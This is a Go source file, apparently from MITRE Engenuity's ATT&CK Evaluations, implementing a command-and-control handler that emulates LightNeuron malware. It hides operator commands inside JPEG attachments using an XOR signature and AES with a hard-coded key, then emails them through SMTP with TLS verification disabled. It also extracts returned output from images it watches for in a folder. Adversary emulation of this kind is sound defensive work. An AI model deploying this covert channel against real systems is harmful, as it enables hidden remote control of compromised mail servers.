package lightneuron

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/logger"

	mail "github.com/xhit/go-simple-mail/v2"
)

// Hold the data needed to authenticate with the Postfix server
type Authentication struct {
	username   string
	password   string
	smtpServer string
	smtpPort   int
}

// Hold the data for the email, may move just into NewEmail object
type EmailData struct {
	from                string
	to                  []string
	attatchmentFilePath string
}

// Represents Light Neuron handler. Will impliment util.Handler interface
type LightNeuronHandler struct {
	restAPIaddress    string
	serverAddress     string
	imageFilePath     string
	watchDirPath      string
	recipient         string
	smtpFrom          string
	auth              Authentication
	encryptionEnabled bool
	//server					*mailServer
}

// Factory method for creating handler
func lightNeuronHandlerFactory() *LightNeuronHandler {
	return &LightNeuronHandler{}
}

func init() {
	util.AvailableHandlers["lightneuron"] = lightNeuronHandlerFactory()
}

// Starts the handler
func (l *LightNeuronHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
	serverAddress, err := config.GetHostPortString(configEntry)
	if err != nil {
		return err
	}
	l.serverAddress = serverAddress
	logger.Info("Starting the LightNeuron Handler")

	// Set the restAPI address
	l.restAPIaddress = restAddress

	// Get the path to the image file used for embedding data
	imageFilePath, ok := configEntry["image_file_path"]
	if !ok {
		l.imageFilePath = ""
	}
	l.imageFilePath = imageFilePath

	// Set the recipient
	recipient, ok := configEntry["recipient"]
	if !ok {
		l.recipient = ""
	}
	l.recipient = recipient

	// Get the path to the image file used for embedding data
	encryption, ok := configEntry["encryption"]
	if !ok {
		l.encryptionEnabled = false
	}
	_encryption, _ := strconv.ParseBool(encryption)
	l.encryptionEnabled = _encryption

	// Get the SMTP Port
	port, ok := configEntry["port"]
	if !ok {
		l.auth.smtpPort = 25
	}
	l.auth.smtpPort, err = strconv.Atoi(port)
	// Get the SMTP Server
	smtpServer, ok := configEntry["host"]
	if !ok {
		l.auth.smtpServer = ""
	}
	l.auth.smtpServer = smtpServer

	// Get the SMTO mail from Address
	mailFrom, ok := configEntry["mailFrom"]
	if !ok {
		l.smtpFrom = ""
	}
	l.smtpFrom = mailFrom

	// Get the username for authenticating with the mail server
	username, ok := configEntry["username"]
	if !ok {
		l.auth.username = ""
	}
	l.auth.username = username

	// Get the password for authentication with the mail server
	password, ok := configEntry["password"]
	if !ok {
		l.auth.password = ""
	}
	l.auth.password = password

	// Get the path for the directory we watch for images to extract from
	watchDirPath, ok := configEntry["watch_dir_path"]
	if !ok {
		l.watchDirPath = "."
		logger.Info("No watch directory found. Watching current directory.")
	}
	l.watchDirPath = watchDirPath

	// register email addresses as C2 sessions
	// go registerImplants(l.recipient, l.restAPIaddress)
	l.registerNewImplant(l.recipient)

	// Forward Beacon to CALDERA
	if config.IsCalderaForwardingEnabled() {
		apiResponse, err := util.ForwardImplantBeacon(l.recipient, l.restAPIaddress)
		if err != nil {
			logger.Error(fmt.Sprintf("Error occured while forwarding implant beacon to CALDERA for session %s: %s", l.recipient, err.Error()))
		} else {
			logger.Info(fmt.Sprintf("Successfully forwarded implant beacon for session %s to CALDERA: %s", l.recipient, apiResponse))
		}
	}

	// Start querying the C2 for availble tasks
	go pollGetTasks(l.recipient, l.restAPIaddress, l.imageFilePath, l.smtpFrom, l.auth.smtpServer, l.auth.smtpPort, l.auth.username, l.auth.password, l.encryptionEnabled)

	// Start the watchdog for extracting data
	go l.watchDir(l.watchDirPath, l.encryptionEnabled)

	return nil
}

// Stops the handler and clears any needed data
func (l *LightNeuronHandler) StopHandler() error {
	return nil
}

var (
	// ErrInvalidBlockSize indicates hash blocksize <= 0.
	ErrInvalidBlockSize = "invalid blocksize"

	// ErrInvalidPKCS7Data indicates bad input to PKCS7 pad or unpad.
	ErrInvalidPKCS7Data = "invalid PKCS7 data (empty or not padded)"

	// ErrInvalidPKCS7Padding indicates PKCS7 unpad fails to bad input.
	ErrInvalidPKCS7Padding = "invalid padding on input"
)

// pkcs7Pad right-pads the given byte slice with 1 to n bytes, where
// n is the block size. The size of the result is x times n, where x
// is at least 1.
func pkcs7Pad(b []byte, blocksize int) []byte {
	n := blocksize - (len(b) % blocksize)
	pb := make([]byte, len(b)+n)
	copy(pb, b)
	copy(pb[len(b):], bytes.Repeat([]byte{byte(n)}, n))
	return pb
}

/*
 *	FUNCTION		: encrypt
 *	DESCRIPTION		:
 *		This function takes a string and a cipher key and uses AES to encrypt the message
 *
 *	PARAMETERS		:
 *		byte[] key	: Byte array containing the cipher key
 *		string message	: String containing the message to encrypt
 *
 *	RETURNS			:
 *		string encoded	: String containing the encoded user input
 *		error err	: Error message
 */
func encrypt(key []byte, plainText []byte) (adsf []byte, err error) {
	// pad the plaintext
	plainText = pkcs7Pad(plainText, aes.BlockSize)

	//Create a new AES cipher using the key
	block, err := aes.NewCipher(key)

	//IF NewCipher failed, exit:
	if err != nil {
		return
	}

	//Make the cipher text a byte array of size BlockSize + the length of the message
	cipherText := make([]byte, aes.BlockSize+len(plainText))

	//iv is the ciphertext up to the blocksize (16)
	iv := make([]byte, aes.BlockSize)
	_, err = rand.Read(iv)
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return
	}

	//Encrypt the data:
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

	num := 0
	for num < aes.BlockSize {
		cipherText[num] = iv[num]
		num++
	}

	//Return ciphertext, error
	return cipherText, err
}

/*
 *	FUNCTION		: decrypt
 *	DESCRIPTION		:
 *		This function takes a string and a key and uses AES to decrypt the string into plain text
 *
 *	PARAMETERS		:
 *		byte[] key	: Byte array containing the cipher key
 *		string secure	: String containing an encrypted message
 *
 *	RETURNS			:
 *		string decoded	: String containing the decrypted equivalent of secure
 *		error err	: Error message
 */
func decrypt(key []byte, cipherText []byte) (decoded []byte, err error) {
	//Create a new AES cipher with the key and encrypted message
	block, err := aes.NewCipher(key)

	//IF NewCipher failed, exit:
	if err != nil {
		return
	}

	//IF the length of the cipherText is less than 16 Bytes:
	if len(cipherText) < aes.BlockSize {
		fmt.Println("Ciphertext block size is too short!")
		return
	}
	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	//Decrypt the message
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)
	return cipherText, err
}

func findSection(sectionID byte, reader *bufio.Reader) {
	var b1 byte
	var b2 byte

	b1, err := reader.ReadByte()
	if err != nil {
		fmt.Println(err)
	}

	// Loop through image file
	for {
		b2, err = reader.ReadByte()
		if err != nil {
			fmt.Println(err)
			break
		}

		if b1 == 255 && b2 == sectionID {
			break
		}

		b1 = b2
	}
}

func checkSignature(filepath string, signature []byte) bool {
	// Buffer for length of jpg section
	sectionLengthBuff := make([]byte, 2)
	// Buffer for holding quantization table values
	quantizationBuffer := make([]byte, 20)
	// Attatchment to send to the transport agent
	// Flags for when we find the needed sections
	quantizationFlag := false

	//sig check flag
	signatureFlag := false

	// Open iamge file to read from
	inFile, err := os.Open(filepath)
	if err != nil {
		fmt.Println(err)
	}
	defer inFile.Close()

	// Set up reader and writer
	reader := bufio.NewReader(inFile)

	// Find section and copy image file
	b1, err := reader.ReadByte()
	if err != nil {
		fmt.Println(err)
	}

	// Loop through the image file
	for {
		b2, err := reader.ReadByte()
		if err != nil {
			break
		}

		// Check for quantization table
		if b1 == 255 && b2 == 219 && !quantizationFlag {
			// Write section length (needed to not break jpg format)
			_, err = reader.Read(sectionLengthBuff)
			if err != nil {
				fmt.Println(err)
				break
			}

			// read btes with xor signature
			reader.Read(quantizationBuffer)
			quantizationFlag = true
			// Resulting xor array
			xor := make([]byte, 8)

			//xor signature
			for i := 0; i < 4; i++ {
				xor[i] = quantizationBuffer[i+4] ^ quantizationBuffer[i]
			}

			for i := 0; i < 4; i++ {
				xor[i+4] = quantizationBuffer[i+10] ^ quantizationBuffer[i]
			}
			if string(xor) == string(signature) {
				signatureFlag = true
			} else {
				signatureFlag = false
			}

		}
	}
	return signatureFlag
}

// Extracts data from given image file
func (l *LightNeuronHandler) ExtractData(path string, encryptionEnabled bool) string {
	// Buffer for length of jpg section
	sectionLengthBuff := make([]byte, 2)
	// Buffer for lenght of container sections
	containerLengthBuff := make([]byte, 4)
	// Hold the length of a section of the jpg image

	// Hold the length of the container so we know how much to read
	containerLength := uint32(0)
	// do signature check and return if failed
	if checkSignature(path, []byte("pwndsnek")) == false {
		return ""
	}
	// Image file to read from
	inFile, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
	}
	defer inFile.Close()

	reader := bufio.NewReader(inFile)

	// Find SoS Section
	findSection(218, reader)

	// Get the length of the SoS section
	_, err = reader.Read(sectionLengthBuff)
	if err != nil {
		fmt.Println(err)
	}

	// Get the lenght of the container holding the data to extract
	_, err = reader.Read(containerLengthBuff)
	if err != nil {
		fmt.Println(err)
	}
	containerLength = binary.BigEndian.Uint32(containerLengthBuff)

	// check container length before trying to read it. If its 0 then we just want to return.
	if int(containerLength) == 0 {
		return ""
	}
	// total size of bytes read by the readline func.
	total_read := 0
	// Buffer to hold the data we want to read
	containerBuff := make([]byte, (int(containerLength)))

	for (int(containerLength)) != int(total_read) {
		b, err := reader.ReadByte()
		if err != nil {
			fmt.Println(err)
		}
		containerBuff[total_read] = b
		total_read += 1

	}
	if encryptionEnabled == true {
		key := "thisis32bitlongpassphraseimusing"
		cb, err := decrypt([]byte(key), containerBuff)

		if err != nil {
			fmt.Println(err)
		}
		util.ForwardTaskOutput(l.restAPIaddress, l.recipient, cb)
		return string(cb)

	} else {
		util.ForwardTaskOutput(l.restAPIaddress, l.recipient, containerBuff)
		return string(containerBuff)
	}

}

// Write the signature into the image
func writeSignature(writer *bufio.Writer, input []byte) int {
	// Value that will be hard coded into Companion dll
	// Value is chosen arbitrarily, but should be 8 char:
	// https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=22
	signature := []byte("pwndsnek")
	// Resulting xor array
	xor := make([]byte, 8)
	// What will be written to file
	result := make([]byte, 14)

	for i := 0; i < 4; i++ {
		xor[i] = signature[i] ^ input[i]
	}

	for i := 0; i < 4; i++ {
		xor[i+4] = signature[i+4] ^ input[i]
	}
	// Order represented in CTI
	// https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf#page=22
	result[0] = input[0]
	result[1] = input[1]
	result[2] = input[2]
	result[3] = input[3]
	result[4] = xor[0]
	result[5] = xor[1]
	result[6] = xor[2]
	result[7] = xor[3]
	result[8] = input[8] // Filler byte
	result[9] = input[9] // Filler byte
	result[10] = xor[4]
	result[11] = xor[5]
	result[12] = xor[6]
	result[13] = xor[7]

	// NOTE FOR DEBUG (Snake pic writing at 0x0855)
	writer.Write(result)

	return len(result)

}

// Generates the command data to be injected into the image
func generateCommandBuffer(command string) []byte {
	commandBuffer := []byte{}

	// create command buffer
	sizeBuffer := make([]byte, 4)
	argumentBuffer := []byte(command)

	binary.BigEndian.PutUint32(sizeBuffer, uint32(len(command)))

	commandBuffer = append(commandBuffer, sizeBuffer...)
	commandBuffer = append(commandBuffer, argumentBuffer...)

	return commandBuffer
}

// Generate the container to be injected into the image
func generateContainerBuffer(cmdID int, recipient string, command string) []byte {
	containerBuffer := []byte{}
	containerSizeBuffer := make([]byte, 4)
	containerSize := 0
	cmdIDBuffer := make([]byte, 4)
	recipientLengthBuffer := make([]byte, 4)
	recipientBuffer := []byte(recipient)
	commandBuffer := generateCommandBuffer(command)

	// Calculate size of container
	containerSize += len(containerSizeBuffer)
	containerSize += len(cmdIDBuffer)
	containerSize += len(recipientLengthBuffer)
	containerSize += len(recipientBuffer)
	containerSize += len(commandBuffer)

	// Convert sizes to binary values
	binary.BigEndian.PutUint32(cmdIDBuffer, uint32(cmdID))
	binary.BigEndian.PutUint32(recipientLengthBuffer, uint32(len(recipient)))
	binary.BigEndian.PutUint32(containerSizeBuffer, uint32(containerSize))

	// Combine buffers into command buffer
	containerBuffer = append(containerBuffer, containerSizeBuffer...)
	containerBuffer = append(containerBuffer, cmdIDBuffer...)
	containerBuffer = append(containerBuffer, recipientLengthBuffer...)
	containerBuffer = append(containerBuffer, recipientBuffer...)
	containerBuffer = append(containerBuffer, commandBuffer...)

	return containerBuffer
}

// encrypt data in container and return to container buffer function
func generateEncryptedContainerData(cmdID int, recipient string, command string) []byte {
	containerBuffer := []byte{}
	cmdIDBuffer := make([]byte, 4)
	recipientLengthBuffer := make([]byte, 4)
	recipientBuffer := []byte(recipient)
	commandBuffer := generateCommandBuffer(command)

	// Convert sizes to binary values
	binary.BigEndian.PutUint32(cmdIDBuffer, uint32(cmdID))
	binary.BigEndian.PutUint32(recipientLengthBuffer, uint32(len(recipient)))

	// Combine buffers into command buffer
	//containerBuffer = append(containerBuffer, containerSizeBuffer...)
	containerBuffer = append(containerBuffer, cmdIDBuffer...)
	containerBuffer = append(containerBuffer, recipientLengthBuffer...)
	containerBuffer = append(containerBuffer, recipientBuffer...)
	containerBuffer = append(containerBuffer, commandBuffer...)
	// encrypted the container with AES256
	// cipher key
	key := "thisis32bitlongpassphraseimusing"

	cb, err := encrypt([]byte(key), containerBuffer)
	if err != nil {
		fmt.Println(err)
	}
	return cb
}

// Generate the container to be injected into the image
func generateContainerBufferEncrypted(cmdID int, recipient string, command string) []byte {
	containerBuffer := []byte{}
	containerSizeBuffer := make([]byte, 4)
	containerSize := 0
	encryptedContainerBuffer := generateEncryptedContainerData(cmdID, recipient, command)

	// Calculate size of container
	containerSize += len(containerSizeBuffer)
	containerSize += len(encryptedContainerBuffer)

	// Convert sizes to binary values
	binary.BigEndian.PutUint32(containerSizeBuffer, uint32(containerSize))

	// Combine buffers into command buffer
	containerBuffer = append(containerBuffer, containerSizeBuffer...)
	containerBuffer = append(containerBuffer, encryptedContainerBuffer...)
	return containerBuffer
}

// Embed data into an image
func Embed(filepath string, cmdID int, recipient string, command string, encryptionEnabled bool) string {
	// Buffer for length of jpg section
	sectionLengthBuff := make([]byte, 2)
	// Buffer for holding quantization table values
	quantizationBuffer := make([]byte, 14)
	// Attatchment to send to the transport agent
	outputFile := strings.Split(filepath, ".jpg")[0] + "_modified.jpg"

	// Flags for when we find the needed sections
	quantizationFlag := false
	startOfScanFlag := false

	// Open iamge file to read from
	inFile, err := os.Open(filepath)
	if err != nil {
		fmt.Println(err)
	}
	defer inFile.Close()

	// Open the file to create a new attatchment with embedded data
	outFile, err := os.OpenFile(outputFile, os.O_RDWR|os.O_CREATE, 0666)
	if err != nil {
		fmt.Println(err)
	}
	defer outFile.Close()

	// Set up reader and writer
	reader := bufio.NewReader(inFile)
	writer := bufio.NewWriterSize(outFile, 20)

	// Find section and copy image file
	b1, err := reader.ReadByte()
	if err != nil {
		fmt.Println(err)
	}

	// Loop through the image file
	for {
		err = writer.WriteByte(b1)
		if err != nil {
			fmt.Printf("Writer error: %v\n", err)
		}
		b2, err := reader.ReadByte()
		if err != nil {
			writer.Flush()
			break
		}

		// Check for quantization table
		if b1 == 255 && b2 == 219 && !quantizationFlag {
			writer.WriteByte(b2)
			// Write section length (needed to not break jpg format)
			_, err = reader.Read(sectionLengthBuff)
			if err != nil {
				fmt.Println(err)
				break
			}
			writer.Write(sectionLengthBuff)

			// Write signature to the modified file
			reader.Read(quantizationBuffer)
			_ = writeSignature(writer, quantizationBuffer)
			quantizationFlag = true

			b2, err = reader.ReadByte()
			if err != nil {
				fmt.Println(err)
				break
			}
		}

		// Check for Start of Scan section
		// FOR DEBUG: In snake pic, data written at 0x0A24
		if b1 == 255 && b2 == 218 && !startOfScanFlag {
			startOfScanFlag = true

			writer.WriteByte(b2)
			// Write section length (needed to not break jpg format)
			_, err = reader.Read(sectionLengthBuff)
			if err != nil {
				fmt.Println(err)
				break
			}
			writer.Write(sectionLengthBuff)

			// Generate the command data nd write it to the few file
			if encryptionEnabled {
				containerBuff := generateContainerBufferEncrypted(cmdID, recipient, command)
				writer.Write(containerBuff)
			} else {
				containerBuff := generateContainerBuffer(cmdID, recipient, command)
				writer.Write(containerBuff)
			}

			b2, err = reader.ReadByte()
			if err != nil {
				fmt.Println(err)
				break
			}
		}
		b1 = b2
	}
	return outputFile
}

// Send the email over Postfix using crafted jpeg file
func SendEmail(emailTo string, attachmentPath string, smtpFrom string, smtpServer string, smtpPort int, username string, password string) {
	server := mail.NewSMTPClient()

	// SMTP Server
	server.Host = smtpServer
	server.Port = smtpPort
	server.Username = username
	server.Password = password
	//server.Encryption = mail.EncryptionSTARTTLS

	server.Authentication = mail.AuthPlain

	// Variable to keep alive connection
	server.KeepAlive = false

	// Timeout for connect to SMTP Server
	server.ConnectTimeout = 10 * time.Second

	// Timeout for send the data and wait respond
	server.SendTimeout = 10 * time.Second

	// Set TLSConfig to provide custom TLS configuration. For example,
	// to skip TLS verification (useful for testing):
	server.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	// SMTP client
	smtpClient, err := server.Connect()

	if err != nil {
		fmt.Println(err)
	}

	// New email simple html with inline and CC
	email := mail.NewMSG()
	email.SetFrom(smtpFrom).
		AddTo(emailTo).
		SetSubject("Confirmation")

	// add inline
	email.Attach(&mail.File{FilePath: attachmentPath, Name: "snake.jpg", Inline: true})
	// always check error after send
	if email.Error != nil {
		fmt.Println(email.Error)
	}

	// Call Send and pass the client
	err = email.Send(smtpClient)
	if err != nil {
		fmt.Println(err)
	} else {
		logger.Info("Email sent to", emailTo)
	}

}

// Set up a watchdog to check for new images to extract data from
func (l *LightNeuronHandler) watchDir(dirname string, encryptionEnabled bool) {
	for {
		// Get the absolute path to the directory we are checking
		dir, err := filepath.Abs(dirname)
		if err != nil {
			fmt.Println(err)
		}
		// Open the directory.
		outputDirRead, err := os.Open(dir)
		if err != nil {
			fmt.Println(err)
		}

		// Get files from directory
		curFiles, err := outputDirRead.Readdir(0)
		if err != nil {
			fmt.Println(err)
		}

		// Check if files are jpg's and if the are already in the array
		for _, f := range curFiles {
			// Append the directory path to the filename
			file := dir + "/" + f.Name()

			// If the file is an image file, extract data from it
			if filepath.Ext(file) == ".jpg" {
				l.ExtractData(file, encryptionEnabled)

				// Rename the file so that we know it has been read from
				os.Rename(file, file+".modified")
			}
		}

		// Sleep for 5 seconds and then check directory again
		time.Sleep(5 * time.Second)

	}

}

// Returns bytes representing JSON dict containing specified implant ID.
func createNewSessionDataBytes(guid string) []byte {
	jsonStr, err := json.Marshal(map[string]string{"guid": guid})
	if err != nil {
		logger.Error(fmt.Sprintf("Failed to create JSON info for session ID %s: %s", guid, err.Error()))
		return nil
	}
	return []byte(jsonStr)
}

// Forward the request to the REST API server to register our implant
func forwardRegisterImplant(restAPIaddress string, implantData []byte) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(implantData))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	return util.ExtractRestApiStringResponsedData(response)
}

// Create sessions with the addresses from the recipients file
func registerImplants(recipient string, restAPIaddress string) {

	// register implant
	guid := createNewSessionDataBytes(recipient)
	fmt.Println(guid, restAPIaddress)
	res, err := forwardRegisterImplant(restAPIaddress, guid)
	if err != nil {
		fmt.Println(res, err)
	}
}

// Create a new session for the implant
func (l *LightNeuronHandler) registerNewImplant(guid string) error {
	implantData := createNewSessionDataBytes(guid)
	restResponse, err := forwardRegisterImplant(l.restAPIaddress, implantData)
	if err != nil {
		return err
	}

	logger.Info(restResponse)
	logger.Success(fmt.Sprintf("Successfully created session for implant %s.", guid))
	return nil
}

// Query the REST API for tasks for the implant with the specified UUID.
// return the task as a string and any errors received
func forwardGetTask(restAPIaddress string, uuid string) (string, error) {
	url := "http://" + restAPIaddress + "/api/v1.0/session/" + uuid + "/task"
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	sessionData, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

// Format the C2 task prior to  embedding into the image
func formatCommand(c2Command string) (string, string, error) {
	var err error
	trimmedTask := strings.TrimSpace(c2Command)
	tokens := strings.Split(trimmedTask, "|")
	if len(tokens) != 2 {
		return "", "", err
	}
	return strings.TrimSpace(tokens[0]), strings.TrimSpace(tokens[1]), err
}

// poll the restAPI server for tasks based on UUID (email addr)
// execute any tasks received
func pollGetTasks(recipient string, restAPIaddress string, imageFilePath string, smtpFrom string, smtpServer string, smtpPort int, username string, password string, encryptionEnabled bool) {
	//Sleep 5 before first query
	time.Sleep(5 * time.Second)
	for {
		task, err := forwardGetTask(restAPIaddress, recipient)
		if err != nil {
			fmt.Println(err)
		}
		// execute task if there is one
		if len(task) > 0 {
			cmdID, command, err := formatCommand(task)
			cmdID = strings.ReplaceAll(cmdID, " ", "")
			cmdIDint, err := strconv.Atoi(cmdID)
			if err != nil {
				fmt.Println("test", err)
			}
			// Embed C2 tasking into the jpg image
			modified := Embed(imageFilePath, cmdIDint, recipient, command, encryptionEnabled)
			// Send the email with the jpg attachment
			SendEmail(recipient, modified, smtpFrom, smtpServer, smtpPort, username, password)
		}

		//Sleep 5 before querying for tasks again
		time.Sleep(5 * time.Second)
	}
}
